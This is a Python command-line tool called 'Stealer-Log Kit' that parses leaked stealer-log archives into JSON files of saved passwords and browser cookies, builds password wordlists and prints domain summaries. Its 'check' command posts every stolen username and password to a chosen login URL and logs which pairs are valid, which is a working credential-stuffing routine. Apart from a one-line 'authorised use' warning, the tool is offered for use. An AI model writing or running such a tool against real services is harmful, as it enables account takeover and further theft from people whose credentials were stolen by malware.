#!/usr/bin/env python3
"""
Stealer-Log Kit
===============
Penetration-testing assistant for analysing leaked stealer-log archives.

WARNING: Use only on data you are authorised to test.
"""
import argparse, json, logging, hashlib, re
from pathlib import Path
from datetime import datetime
from typing import List, Dict
from zipfile import ZipFile

try:
    import rarfile
except ImportError:
    rarfile = None
try:
    import py7zr
except ImportError:
    py7zr = None
try:
    import requests
except ImportError:
    requests = None

logging.basicConfig(level=logging.INFO, format='%(levelname)s ▸ %(message)s')

ARCHIVE_EXTS = {'.zip', '.rar', '.7z'}

def sha1(b: bytes) -> str:
    return hashlib.sha1(b).hexdigest()

def read_archive(path: Path) -> Dict[str, bytes]:
    data = {}
    ext = path.suffix.lower()
    try:
        if ext == '.zip':
            with ZipFile(path) as z:
                for n in z.namelist():
                    if not n.endswith('/'):
                        data[n] = z.read(n)
        elif ext == '.rar' and rarfile:
            with rarfile.RarFile(path) as r:
                for n in r.namelist():
                    if not n.endswith('/'):
                        data[n] = r.read(n)
        elif ext == '.7z' and py7zr:
            with py7zr.SevenZipFile(path, 'r') as sz:
                for n, bio in sz.readall().items():
                    data[n] = bio.read()
    except Exception as e:
        logging.warning(f'Archive error {path}: {e}')
    return data

def parse_passwords(raw: bytes) -> List[Dict[str, str]]:
    rows = []
    for line in raw.decode(errors='ignore').splitlines():
        cols = [c.strip() for c in re.split(r'[\t|;]', line) if c.strip()]
        if len(cols) >= 3:
            rows.append({'url': cols[0], 'username': cols[1], 'password': cols[2]})
    return rows

def parse_cookies(raw: bytes) -> List[Dict[str, str]]:
    cookies = []
    for line in raw.decode(errors='ignore').splitlines():
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies.append({
                'domain': parts[0],
                'flag': parts[1],
                'path': parts[2],
                'secure': parts[3],
                'expiry': parts[4],
                'name': parts[5],
                'value': parts[6],
            })
    return cookies

def cmd_parse(args):
    in_dir = Path(args.in_dir).expanduser()
    out_dir = Path(args.out_dir).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    pw, ck, other = [], [], []
    whitelist = [d.strip().lower() for d in args.domains.split(',')] if args.domains else []
    for arch in in_dir.rglob('*'):
        if arch.suffix.lower() not in ARCHIVE_EXTS:
            continue
        files = read_archive(arch)
        for name, blob in files.items():
            lname = name.lower()
            try:
                if lname.endswith('passwords.txt'):
                    for row in parse_passwords(blob):
                        if whitelist and not any(dom in row['url'].lower() for dom in whitelist):
                            continue
                        row['source'] = str(arch)
                        pw.append(row)
                elif 'cookie' in lname and lname.endswith('.txt'):
                    ck.extend(parse_cookies(blob))
                else:
                    other.append({'archive': str(arch), 'file': name, 'sha1': sha1(blob)})
            except Exception:
                continue
    (out_dir/'passwords.json').write_text(json.dumps(pw, indent=2))
    (out_dir/'cookies.json').write_text(json.dumps(ck, indent=2))
    (out_dir/'other_files.json').write_text(json.dumps(other, indent=2))
    logging.info(f'Saved output to {out_dir}')

def cmd_wordlist(args):
    rows = json.loads(Path(args.parsed).read_text())
    pwset = {r['password'] for r in rows}
    Path(args.out).write_text('\n'.join(sorted(pwset)))
    logging.info(f'Wordlist {args.out} ({len(pwset)} unique)')

def cmd_summary(args):
    pdir = Path(args.parsed)
    pw = json.loads((pdir/'passwords.json').read_text()) if (pdir/'passwords.json').exists() else []
    ck = json.loads((pdir/'cookies.json').read_text()) if (pdir/'cookies.json').exists() else []
    domains = {}
    for r in pw:
        try:
            dom = r['url'].split('/')[2] if '://' in r['url'] else r['url']
            domains[dom] = domains.get(dom, 0) + 1
        except Exception:
            continue
    rep = {
        'total_passwords': len(pw),
        'total_cookies': len(ck),
        'top_domains': sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10],
        'generated': datetime.utcnow().isoformat()+'Z'
    }
    print(json.dumps(rep, indent=2))

def cmd_check(args):
    if requests is None:
        logging.error('Install requests for check command')
        return
    creds = json.loads(Path(args.parsed).read_text())
    for r in creds:
        try:
            resp = requests.post(args.url, data={args.user_field: r['username'], args.pass_field: r['password']}, timeout=10, allow_redirects=False)
            if resp.status_code == int(args.success_code):
                logging.info(f'VALID -> {r["username"]}:{r["password"]}')
        except Exception:
            continue

def main():
    p = argparse.ArgumentParser(description='Stealer-Log Kit')
    sub = p.add_subparsers(dest='cmd', required=True)

    sp = sub.add_parser('parse')
    sp.add_argument('--in', dest='in_dir', required=True)
    sp.add_argument('--out', dest='out_dir', required=True)
    sp.add_argument('--domains', default='')

    sp2 = sub.add_parser('wordlist')
    sp2.add_argument('--parsed', required=True)
    sp2.add_argument('--out', required=True)

    sp3 = sub.add_parser('summary')
    sp3.add_argument('--parsed', required=True)

    sp4 = sub.add_parser('check')
    sp4.add_argument('--parsed', required=True)
    sp4.add_argument('--url', required=True)
    sp4.add_argument('--user-field', default='username')
    sp4.add_argument('--pass-field', default='password')
    sp4.add_argument('--success-code', default='302')

    args = p.parse_args()
    if args.cmd == 'parse':
        cmd_parse(args)
    elif args.cmd == 'wordlist':
        cmd_wordlist(args)
    elif args.cmd == 'summary':
        cmd_summary(args)
    elif args.cmd == 'check':
        cmd_check(args)

if __name__ == '__main__':
    main()
